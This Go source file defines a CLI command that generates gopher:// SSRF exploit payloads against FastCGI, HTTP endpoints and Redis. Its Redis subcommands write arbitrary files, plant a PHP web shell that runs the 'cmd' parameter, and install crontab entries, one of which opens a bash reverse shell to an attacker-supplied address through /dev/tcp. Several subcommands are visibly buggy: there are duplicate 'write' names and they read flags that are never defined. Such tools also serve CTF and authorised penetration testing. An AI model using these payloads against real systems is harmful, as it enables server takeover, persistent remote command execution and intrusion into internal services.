package gopher

import (
	"fmt"
	"net"
	"net/url"
	"strings"

	"github.com/go-playground/validator/v10"
	"github.com/urfave/cli/v3"
	"github.com/virzz/logger"
)

// Global Options Flag
var (
	urlencodeFlag = &cli.IntFlag{
		Name:       "urlencode",
		Aliases:    []string{"e"},
		Value:      0,
		Usage:      "Urlencode count",
		Persistent: true,
		Action: func(c *cli.Context, f int) error {
			logger.Debug(f)
			return nil
		},
	}

	targetAddrFlag = &cli.StringFlag{
		Name:     "target",
		Aliases:  []string{"t"},
		Usage:    "Target addr",
		Required: true,
		Action: func(c *cli.Context, target string) error {
			return validator.New().Var(target, "tcp_addr|hostname_port|url")
		},
	}

	targetURLFlag = &cli.StringFlag{
		Name:     "target",
		Aliases:  []string{"t"},
		Usage:    "Target URL",
		Required: true,
		Action: func(c *cli.Context, target string) error {
			return validator.New().Var(target, "url|ip")
		},
	}

	filenameFlag = &cli.StringFlag{
		Name:       "filename",
		Aliases:    []string{"f"},
		Value:      "",
		Usage:      "Filename",
		Persistent: true,
	}

	filepathFlag = &cli.StringFlag{
		Name:    "filepath",
		Aliases: []string{"p"},
		Value:   "",
		Usage:   "Filepath",
	}

	contentFlag = &cli.StringFlag{
		Name:    "content",
		Aliases: []string{"c"},
		Value:   "",
		Usage:   "Content",
	}

	redisFlags = []cli.Flag{
		targetAddrFlag,
		filenameFlag,
		filepathFlag,
		contentFlag,
	}
)

func QueryEscape(r string, count int) string {
	for i := 0; i < count; i++ {
		r = url.QueryEscape(r)
	}
	return r
}

var Cmd = &cli.Command{
	Category:        "Web",
	Name:            "gopher",
	Usage:           "Generate Gopher Exp",
	Flags: []cli.Flag{
		urlencodeFlag,
	},
	Commands: []*cli.Command{

		// fastcgi
		&cli.Command{
			Category: "Other",
			Name:     "fastcgi",
			Aliases:  []string{"fcgi"},
			Usage:    "FastCGI",
			Flags: []cli.Flag{
				targetAddrFlag,
				filenameFlag,
				&cli.StringFlag{
					Name:    "command",
					Aliases: []string{"c"},
					Value:   "id",
					Usage:   "Command",
				},
			},
			Action: func(c *cli.Context) (err error) {
				filename := c.String("filename")
				if filename == "" {
					filename = "/usr/share/php/PEAR.php"
				}
				r, err := GopherFastCGIExp(c.String("target"), c.String("command"), filename)
				if err != nil {
					return err
				}
				// urlencode
				r = QueryEscape(r, c.Int("urlencode"))
				_, err = fmt.Println(r)
				return
			},
		},

		// http post
		&cli.Command{
			Category: "HTTP",
			Name:     "post",
			Usage:    "HTTP Post",
			Flags: []cli.Flag{
				targetURLFlag,
				&cli.StringMapFlag{
					Name:     "data",
					Aliases:  []string{"d"},
					Usage:    "Post data. key=value",
					Required: true,
				},
			},
			Action: func(c *cli.Context) (err error) {
				target := c.String("target")
				if !strings.HasPrefix(target, "http") {
					target = fmt.Sprintf("http://%s", target)
				}
				targetURL, err := url.Parse(target)
				if err != nil {
					return err
				}
				r, err := GopherHTTPPostExp(targetURL.Host, targetURL.RequestURI(), c.StringMap("data"))
				if err != nil {
					return err
				}
				r = QueryEscape(r, c.Int("urlencode"))
				_, err = fmt.Println(r)
				return
			},
		},

		// http upload
		&cli.Command{
			Category: "HTTP",
			Name:     "upload",
			Usage:    "HTTP Upload",
			Flags: []cli.Flag{
				targetURLFlag,
				&cli.StringMapFlag{
					Name:     "data",
					Aliases:  []string{"d"},
					Usage:    "Post data/upload file. key=value or name=content",
					Required: true,
				},
			},
			Action: func(c *cli.Context) (err error) {
				target := c.String("target")
				if !strings.HasPrefix(target, "http") {
					target = fmt.Sprintf("http://%s", target)
				}
				targetURL, err := url.Parse(target)
				if err != nil {
					return err
				}
				r, err := GopherHTTPUploadExp(targetURL.Host, targetURL.RequestURI(), c.StringMap("data"))
				if err != nil {
					return err
				}
				r = QueryEscape(r, c.Int("urlencode"))

				_, err = fmt.Println(r)
				return
			},
		},

		// listen
		&cli.Command{
			Category: "Redis",
			Name:     "listen",
			Usage:    "By Listen redis-cli command",
			Flags: []cli.Flag{
				&cli.IntFlag{
					Name:    "port",
					Aliases: []string{"p"},
					Value:   9527,
					Usage:   "Listen Port",
				},
				&cli.IntFlag{
					Name:    "times",
					Aliases: []string{"t"},
					Value:   1,
					Usage:   "Number of accept times",
				},
				&cli.BoolFlag{
					Name:    "no-quit",
					Aliases: []string{"no"},
					Value:   true,
					Usage:   "Redis reply 'quit' at the end",
				},
			},
			Action: func(c *cli.Context) (err error) {
				if c.NArg() < 1 {
					return fmt.Errorf("not found arg [addr]")
				}
				r, err := GenGopherExpByListen(c.String("target"), c.Int("port"), !c.Bool("no-quit"))
				if err != nil {
					return err
				}
				for i := 0; i < c.Int("urlencode"); i++ {
					r = url.QueryEscape(r)
				}
				_, err = fmt.Println(r)
				return
			},
		},

		// Write
		&cli.Command{
			Category: "Redis",
			Name:     "write",
			Usage:    "Redis Write File",
			Flags:    redisFlags,
			Action: func(c *cli.Context) (err error) {
				target := c.String("target")
				filename := c.String("filename")
				filepath := c.String("filepath")
				content := c.String("content")
				if filename == "" {
					filename = "root"
				}
				if filepath == "" {
					filepath = "/var/www/html/"
				}
				if content == "" {
					content = "Gopher Exp Redis Write File"
				}
				r, err := GopherRedisWriteExp(target, filepath, filename, content)
				if err != nil {
					return err
				}
				r = QueryEscape(r, c.Int("urlencode"))
				_, err = fmt.Println(r)
				return
			},
		},

		// Webshell
		&cli.Command{
			Category: "Redis",
			Name:     "webshell",
			Usage:    "Redis Write Webshell",
			Flags:    redisFlags,
			Action: func(c *cli.Context) (err error) {
				target := c.String("target")
				filename := c.String("filename")
				filepath := c.String("filepath")
				content := c.String("content")
				if filename == "" {
					filename = "virzz.php"
				}
				if filepath == "" {
					filepath = "/var/www/html/"
				}
				if content == "" {
					content = "\r\n<?php system($_GET['cmd']);?>\r\n"
				}
				r, err := GopherRedisWriteExp(target, filepath, filename, content)
				if err != nil {
					return err
				}
				r = QueryEscape(r, c.Int("urlencode"))
				_, err = fmt.Println(r)
				return
			},
		},

		// Crontab
		&cli.Command{
			Category: "Redis",
			Name:     "write",
			Usage:    "Redis Write Crontab",
			Flags:    redisFlags,
			Action: func(c *cli.Context) (err error) {
				target := c.String("target")
				filename := c.String("filename")
				filepath := c.String("filepath")
				content := c.String("content")
				if filename == "" {
					filename = "root"
				}
				if filepath == "" {
					filepath = "/var/spool/cron/"
				}
				if content == "" {
					content = fmt.Sprintf("\n\n\n\n*/1 * * * * sh -c \"%s\"\n\n\n\n", c.String("crontab"))
				}
				r, err := GopherRedisWriteExp(target, filepath, filename, content)
				if err != nil {
					return err
				}
				r = QueryEscape(r, c.Int("urlencode"))
				_, err = fmt.Println(r)
				return
			},
		},

		// Crontab Reverse
		&cli.Command{
			Category: "Redis",
			Name:     "reverse",
			Usage:    "Redis Write File",
			Flags: []cli.Flag{
				targetAddrFlag,
				filenameFlag,
				filepathFlag,
				&cli.StringFlag{
					Name:    "reverse",
					Aliases: []string{"r"},
					Usage:   "Write Crontab Reverse shell addr",
					Action: func(c *cli.Context, target string) error {
						return validator.New().Var(target, "tcp_addr")
					},
				},
			},
			Action: func(c *cli.Context) (err error) {
				target := c.String("target")
				filename := c.String("filename")
				filepath := c.String("filepath")
				if filename == "" {
					filename = "root"
				}
				if filepath == "" {
					filepath = "/var/spool/cron/"
				}
				addr, _ := net.ResolveTCPAddr("tcp", c.String("reverse"))
				content := fmt.Sprintf("\n\n\n\n*/1 * * * * sh -c \"bash -i >& /dev/tcp/%s/%d 0>&1\"\n\n\n\n", addr.IP.String(), addr.Port)
				r, err := GopherRedisWriteExp(target, filepath, filename, content)
				if err != nil {
					return err
				}
				r = QueryEscape(r, c.Int("urlencode"))
				_, err = fmt.Println(r)
				return
			},
		},
	},
}
